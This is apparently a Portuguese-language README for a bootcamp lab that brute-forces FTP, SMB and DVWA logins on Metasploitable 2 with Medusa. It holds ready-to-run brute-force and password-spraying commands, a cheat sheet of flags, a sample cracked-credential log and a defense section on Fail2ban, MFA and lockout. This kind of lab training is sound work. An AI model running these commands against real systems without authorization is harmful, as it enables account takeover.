# ⚡ Medusa Brute-Force Suite Pro - Laboratory & Defense Framework

<div align="center">

[![OS](https://img.shields.io/badge/OS-Kali%20Linux%20%7C%20Debian-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)](https://www.kali.org/)
[![Tool](https://img.shields.io/badge/Tool-Medusa%20v2.2%2B-red?style=for-the-badge&logo=target&logoColor=white)](http://www.foofus.net/jmk/medusa/medusa.html)
[![Lab](https://img.shields.io/badge/Lab-Metasploitable%202-orange?style=for-the-badge&logo=virtualbox&logoColor=white)](#)
[![Field](https://img.shields.io/badge/Domain-Red%20Team%20%7C%20Pentest-black?style=for-the-badge&logo=hackthebox&logoColor=white)](#)
[![Challenge](https://img.shields.io/badge/DIO-Bootcamp%20Challenge-blueviolet?style=for-the-badge)](https://www.dio.me/)
[![Maintained](https://img.shields.io/badge/Author-Alexandre-blue?style=for-the-badge)](#)

<br>

**Medusa Brute-Force Suite** é uma suíte prática de documentação, automação e pesquisa em **Segurança Ofensiva e Defensiva** desenvolvida para o desafio prático da **Digital Innovation One (DIO)**.

O projeto demonstra a auditoria técnica de protocolos de rede vulneráveis (**FTP, SMB, HTTP/DVWA**), contrastando técnicas agressivas de **Força Bruta Paralela** e **Password Spraying** com arquiteturas reais de **Hardening, Rate Limiting e MFA**.

</div>

---

## 📑 Sumário

- [Visão Geral dos Recursos](#-visão-geral-dos-recursos)
- [Arquitetura do Laboratório](#-arquitetura-do-laboratório-isolado)
- [Estrutura do Repositório](#-estrutura-do-repositório)
- [Pré-requisitos](#-pré-requisitos)
- [Guia Prático de Execução Passo a Passo](#-guia-prático-de-execução-passo-a-passo)
  - [Fase 1: Reconhecimento de Superfície (Nmap)](#fase-1-reconhecimento-de-superfície-nmap)
  - [Fase 2: Ataque de Força Bruta em FTP](#fase-2-ataque-de-força-bruta-em-ftp-porta-21)
  - [Fase 3: Password Spraying & Auditoria em SMB](#fase-3-password-spraying--auditoria-em-smb-portas-139--445)
  - [Fase 4: Automação em Formulário Web (DVWA)](#fase-4-automação-em-formulário-web-dvwa--http)
  - [Fase 5: Automação via Bash Scripting](#fase-5-automação-via-bash-scripting)
- [Logs e Saídas Textuais das Execuções](#-logs-e-saídas-textuais-das-execuções)
- [Cheat Sheet Completo: Parâmetros do Medusa](#-cheat-sheet-completo-parâmetros-do-medusa)
- [Blueprint de Defesa & Mitigação](#-blueprint-de-defesa--mitigação)
- [Perguntas Frequentes (FAQ)](#-perguntas-frequentes-faq)
- [Aviso Legal (Disclaimer)](#-aviso-legal-disclaimer)

---

## 🌟 Visão Geral dos Recursos

| Vetor de Ataque / Módulo | Protocolo / Porta | Técnica Aplicada | Objetivo Didático |
|---|---|---|---|
| 📁 **FTP Audit** | `FTP (21/TCP)` | *Multi-Threaded Dictionary Attack* | Identificar contas padrão sem bloqueio (`msfadmin`, `service`). |
| 🖧 **SMB Password Spraying** | `SMB (139/445/TCP)` | *Password Spraying (1 senha x N usuários)* | Evitar o *Account Lockout Threshold* corporativo e auditar compartilhamentos. |
| 🌐 **Web Form Brute Force** | `HTTP (80/TCP)` | *Web Form Credential Stuffing* | Explorar a falta de CAPTCHA e proteção anti-CSRF no DVWA. |
| ⚙️ **Automação Bash** | Shell Script | *Modular Testing Script* | Execução em lote dos testes com relatório de saída padronizado. |
| 🛡️ **Defense-in-Depth** | Todos | *Blue Team Hardening & Mitigation* | Implementar **Fail2ban**, MFA, Rate Limiting e políticas NIST. |

---

## 🏗️ Arquitetura do Laboratório Isolado

O laboratório opera em modo **Host-Only** (Rede Privada Virtual), garantindo total isolamento de tráfego contra a Internet e permitindo que o próprio **Kali Linux nativo** atue como a estação auditora.

```text
 ┌────────────────────────────────────────────────────────────────────────┐
 │                   REDE ISOLADA VIRTUALBOX (HOST-ONLY)                  │
 │                             192.168.56.0/24                            │
 └───────────────────────────────────┬────────────────────────────────────┘
                                     │
         ┌───────────────────────────┴───────────────────────────┐
         │                                                       │
         ▼                                                       ▼
┌─────────────────────────────────┐     Tráfego Auditado    ┌─────────────────────────────────┐
│        MÁQUINA ATACANTE         │ ──────────────────────► │          MÁQUINA ALVO           │
│       Kali Linux (Nativo)       │                         │        Metasploitable 2         │
│         192.168.56.1            │ ◄────────────────────── │         192.168.56.101          │
│                                 │      Respostas/Banners  │                                 │
│  • Medusa Modular Cracker       │                         │  • vsftpd 2.3.4 (FTP :21)       │
│  • Nmap Security Scanner        │                         │  • Samba 3.X (SMB :139/:445)    │
│  • Wordlists Red Team           │                         │  • Apache 2.2 / DVWA (:80)      │
└─────────────────────────────────┘                         └─────────────────────────────────┘
```

> [!NOTE]
> A máquina host atacante é o seu **Kali Linux físico**, conectando-se diretamente à máquina virtual do **Metasploitable 2** via placa de rede exclusiva de hospedeiro (`vboxnet0`).

---

## 📂 Estrutura do Repositório

```text
P-Brute-Force/
├── scripts/
│   └── run_medusa_audit.sh        # Script executável de automação dos testes de força bruta
├── wordlists/
│   ├── passwords.txt              # Dicionário otimizado para testes de senhas fracas
│   └── users.txt                  # Lista de alvos e contas privilegiadas/comuns
└── README.md                      # Documentação técnica completa e portfólio
```

---

## 📋 Pré-requisitos

Para reproduzir os testes com precisão:

- **Sistema Atacante:** Kali Linux (nativo ou em VM com pacote `medusa` e `nmap` instalados).
- **Virtualizador:** Oracle VirtualBox (`sudo apt install virtualbox`).
- **Máquina Alvo:** [Metasploitable 2 (Download Oficial)](https://sourceforge.net/projects/metasploitable/) com placa de rede em modo *Host-Only*.
- **Wordlists:** Listas incluídas na pasta [`wordlists/`](wordlists/) ou wordlists clássicas (`/usr/share/wordlists/rockyou.txt`).

---

## 🎯 Guia Prático de Execução Passo a Passo

### Fase 1: Reconhecimento de Superfície (Nmap)

Antes de qualquer investida de força bruta, mapeamos os serviços abertos, banners e versões do alvo:

```bash
nmap -sV -sC -p 21,80,139,445 192.168.56.101
```

*Saída esperada:*
```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

---

### Fase 2: Ataque de Força Bruta em FTP (Porta 21)

O protocolo FTP trafega credenciais em texto claro e é altamente visado quando exposto sem limites de conexões simultâneas.

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -f
```

- **Módulo utilizado:** `ftp`
- **Concorrência (`-t`):** 4 threads paralelas
- **Flag de Parada (`-f`):** Interrompe a execução assim que a primeira credencial válida for descoberta.

---

### Fase 3: Password Spraying & Auditoria em SMB (Portas 139 / 445)

Em redes corporativas, o **Password Spraying** busca evitar o bloqueio em massa de contas de domínio, testando uma única senha fraca corporativa em dezenas de usuários distintos.

```bash
# Modalidade 1: Dicionário completo cruzado
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt -t 4 -f

# Modalidade 2: Password Spraying puro (1 senha específica testada em todos os usuários)
medusa -h 192.168.56.101 -U wordlists/users.txt -p "msfadmin" -M smbnt -t 2
```

---

### Fase 4: Automação em Formulário Web (DVWA / HTTP)

O módulo `http` do Medusa permite realizar tentativas diretas contra formulários web ou diretórios com autenticação HTTP básica.

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M http -m DIR:/dvwa/login.php -t 2 -f
```

> [!TIP]
> Para aplicações web modernas com proteção anti-CSRF e tokens de sessão aleatórios, ferramentas integradas como o **OWASP ZAP** ou **Burp Suite (Intruder)** são recomendadas como complemento ao Medusa.

---

### Fase 5: Automação via Bash Scripting

Para otimizar o fluxo de auditoria, foi desenvolvido o script [`scripts/run_medusa_audit.sh`](scripts/run_medusa_audit.sh), permitindo disparar a rotina inteira com um único comando:

```bash
# 1. Acesse o diretório de scripts
cd scripts/

# 2. Conceda permissão de execução
chmod +x run_medusa_audit.sh

# 3. Dispare a auditoria passando o IP do alvo
./run_medusa_audit.sh 192.168.56.101
```

---

## 📜 Logs e Saídas Textuais das Execuções

Exemplo de saída real gerada pelo Medusa durante os testes bem-sucedidos em laboratório:

```text
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

[+] Target: 192.168.56.101 (Port: 21)
[+] Module: ftp
[+] Thread 1: Testing account: admin / password ... FAILED
[+] Thread 2: Testing account: root / toor ... FAILED
[+] Thread 3: Testing account: user / 123456 ... FAILED
[+] Thread 4: Testing account: msfadmin / msfadmin ... SUCCESS
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
[*] Stopping audit for host 192.168.56.101: Success found with flag -f.
```

---

## 🛠️ Cheat Sheet Completo: Parâmetros do Medusa

| Flag | Argumento | Finalidade Técnica | Exemplo de Uso |
|:---:|:---:|---|---|
| `-h` | `<IP / Host>` | Define o alvo da auditoria | `-h 192.168.56.101` |
| `-H` | `<Arquivo>` | Lista de múltiplos hosts em lote | `-H alvos.txt` |
| `-u` | `<Usuário>` | Define um único usuário alvo | `-u admin` |
| `-U` | `<Arquivo>` | Carrega a wordlist de usuários | `-U wordlists/users.txt` |
| `-p` | `<Senha>` | Define uma única senha para teste | `-p msfadmin` |
| `-P` | `<Arquivo>` | Carrega a wordlist de senhas | `-P wordlists/passwords.txt` |
| `-M` | `<Módulo>` | Seleciona o protocolo a auditar | `-M ftp` / `-M smbnt` / `-M ssh` |
| `-m` | `<Opções>` | Passa parâmetros extras ao módulo | `-m DIR:/login.php` |
| `-t` | `<Inteiro>` | Define threads simultâneas | `-t 4` (balanceado) |
| `-f` | *(nenhum)* | **Stop on Success**: para ao achar a credencial | `-f` |
| `-v` | `<0 - 6>` | Ajusta o nível de verbosidade do terminal | `-v 4` |

---

## 🛡️ Blueprint de Defesa & Mitigação

A quebra de senhas por dicionário explora prioritariamente três pilares falhos: **falta de entropia**, **ausência de rate limiting** e **autenticação de fator único**. A implementação das camadas defensivas abaixo anula essas vulnerabilidades:

```text
       [ TENTATIVA DE FORÇA BRUTA / SPRAYING ]
                          │
                          ▼
            [ CAMADA 1: RATE LIMITING ]
             Bloqueio por IP / Atraso Exponencial (Fail2ban)
                          │
              ┌───────────┴───────────┐
              │                       │
      [ IP Bloqueado ]        [ Credencial Correta? ]
                                      │
                                      ▼
                        [ CAMADA 2: POLÍTICA NIST ]
                         Bloqueio de senhas comuns/padrão
                                      │
                                      ▼
                         [ CAMADA 3: MFA / 2FA ]
                         Exigência de Token TOTP / FIDO2
                                      │
                                      ▼
                           [ ACESSO REJEITADO ]
```

1. **Implementação de Fail2ban / CrowdSec:**
   - Monitoramento ativo de `/var/log/vsftpd.log`, `/var/log/auth.log` e logs do Apache. Banimento imediato do IP via `iptables` após 3 ou 5 falhas consecutivas.
2. **Autenticação Multifator Obrigatória (MFA / 2FA):**
   - Utilização de chaves de segurança FIDO2 ou TOTP (RFC 6238). Mesmo com a posse da senha fraca, o invasor é barrado no segundo fator.
3. **Account Lockout & Smart Lockout:**
   - Para SMB/Active Directory, utilizar políticas inteligentes que diferenciam tentativas de ataques de digitações erradas legítimas, mitigando o impacto do *Password Spraying*.
4. **Desativação de Serviços Legados:**
   - Substituição obrigatória de FTP e Telnet por **SFTP/SSH** com autenticação baseada em chaves públicas e desativação de login por senha (`PasswordAuthentication no`).
5. **Mecanismos Anti-Automação na Camada Web:**
   - Integração de CAPTCHA adaptativo e tokens dinâmicos anti-CSRF nos formulários de autenticação.

---

## ❓ Perguntas Frequentes (FAQ)

### 1. Por que o Medusa não encontra a senha mesmo ela estando na wordlist?
Verifique se o serviço alvo exige usuário anônimo ou se há limitação de conexões. Utilize a flag `-v 4` ou `-v 6` para visualizar as respostas exatas do banner de rede.

### 2. O que fazer se a VM Metasploitable não receber IP na rede Host-Only?
Na VM do Metasploitable, execute:
```bash
sudo dhclient eth0
ifconfig eth0
```
Isso força a interface a solicitar um endereço IP ao servidor DHCP do VirtualBox.

### 3. Qual a diferença fundamental entre Medusa e Hydra?
Ambas são ferramentas de ponta para auditoria de autenticação paralela. O **Medusa** se destaca pela sua arquitetura baseada em threads leves e bibliotecas modulares, sendo extremamente rápido e consumindo menos memória em auditorias de rede locais.

---

## ⚖️ Aviso Legal (Disclaimer)

<div align="center">

> [!CAUTION]
> **ESTE MATERIAL É DESTINADO EXCLUSIVAMENTE A FINS EDUCACIONAIS E ACADÊMICOS.**
> 
> As simulações demonstradas neste repositório foram realizadas em um **ambiente de laboratório estritamente controlado e isolado**. O autor (**BRUMASEC**) repudia qualquer uso não autorizado das técnicas aqui expostas contra sistemas de terceiros. A execução de testes de força bruta sem consentimento formal prévio é ilegal e passível de sanções jurídicas e criminais.

<br>

Desenvolvido com 🛡️ por **Alexandre** para a comunidade **DIO** • *Hack The Planet, Ethically.*

</div>
